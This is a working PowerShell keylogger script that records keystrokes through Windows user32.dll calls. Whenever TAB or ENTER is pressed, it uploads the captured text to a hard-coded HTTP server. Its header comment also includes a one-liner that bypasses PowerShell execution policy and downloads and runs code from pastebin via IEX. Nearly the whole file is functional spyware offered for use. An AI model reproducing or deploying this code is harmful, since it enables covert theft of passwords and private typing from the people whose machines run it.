<#
Script based on PowerShell keystroke logger by shima
http://vacmf.org/2013/01/23/powershell-keylogger/

http post on TAB/ENTER added by Kris Occhipinti http://filmsbykris.com
powershell -executionpolicy bypass "IEX (New-Object Net.WebClient).DownloadString('http://pastebin.com/raw.php?i=Yje6cE3Y');"

#>
function KeyLog {
    $url = "http://192.168.20.158/metalx1000/log.php" 
    # MapVirtualKeyMapTypes
    # <summary>
    # uCode is a virtual-key code and is translated into a scan code.
    # If it is a virtual-key code that does not distinguish between left- and
    # right-hand keys, the left-hand scan code is returned.
    # If there is no translation, the function returns 0.
    # </summary>
    $MAPVK_VK_TO_VSC = 0x00
    
    # <summary>
    # uCode is a scan code and is translated into a virtual-key code that
    # does not distinguish between left- and right-hand keys. If there is no
    # translation, the function returns 0.
    # </summary>
    $MAPVK_VSC_TO_VK = 0x01
    
    # <summary>
    # uCode is a virtual-key code and is translated into an unshifted
    # character value in the low-order word of the return value. Dead keys (diacritics)
    # are indicated by setting the top bit of the return value. If there is no
    # translation, the function returns 0.
    # </summary>
    $MAPVK_VK_TO_CHAR = 0x02
    
    # <summary>
    # Windows NT/2000/XP: uCode is a scan code and is translated into a
    # virtual-key code that distinguishes between left- and right-hand keys. If
    # there is no translation, the function returns 0.
    # </summary>
    $MAPVK_VSC_TO_VK_EX = 0x03
    
    # <summary>
    # Not currently documented
    # </summary>
    $MAPVK_VK_TO_VSC_EX = 0x04
    
    $virtualkc_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
'@

    $kbstate_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
'@

    $mapchar_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
'@

    $tounicode_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    $getKeyState = Add-Type -MemberDefinition $virtualkc_sig -name "Win32GetState" -namespace Win32Functions -passThru
    $getKBState = Add-Type -MemberDefinition $kbstate_sig -name "Win32MyGetKeyboardState" -namespace Win32Functions -passThru
    $getKey = Add-Type -MemberDefinition $mapchar_sig -name "Win32MyMapVirtualKey" -namespace Win32Functions -passThru
    $getUnicode = Add-Type -MemberDefinition $tounicode_sig -name "Win32MyToUnicode" -namespace Win32Functions -passThru
    
    $log = ""
    while ($true) {
     Start-Sleep -Milliseconds 40
     $gotit = ""
     
     for ($char = 1; $char -le 254; $char++) {
       $vkey = $char
       $gotit = $getKeyState::GetAsyncKeyState($vkey)
       
       if ($gotit -eq -32767) {

         $l_shift = $getKeyState::GetAsyncKeyState(160)
         $r_shift = $getKeyState::GetAsyncKeyState(161)
         $caps_lock = [console]::CapsLock
         
         $scancode = $getKey::MapVirtualKey($vkey, $MAPVK_VSC_TO_VK_EX)
         
         $kbstate = New-Object Byte[] 256
         $checkkbstate = $getKBState::GetKeyboardState($kbstate)
         
         $mychar = New-Object -TypeName "System.Text.StringBuilder";
         $unicode_res = $getUnicode::ToUnicode($vkey, $scancode, $kbstate, $mychar, $mychar.Capacity, 0)
         
         if ($unicode_res -gt 0){
           if (($vkey -eq 13) -or ($vkey -eq 9)) {
                
 
                        $fields=new-object System.Collections.Specialized.NameValueCollection 
                        $fields.Add("log",$log) 
                        $wc = new-object System.Net.WebClient 
                        $wc.UploadValues($url, $fields) 
                        $wc 
                  
             $log = ""
           }else{
             $log = "$($log)$($mychar.ToString())"
             echo $log
           }
         }
       }
     }
    }
}

KeyLog
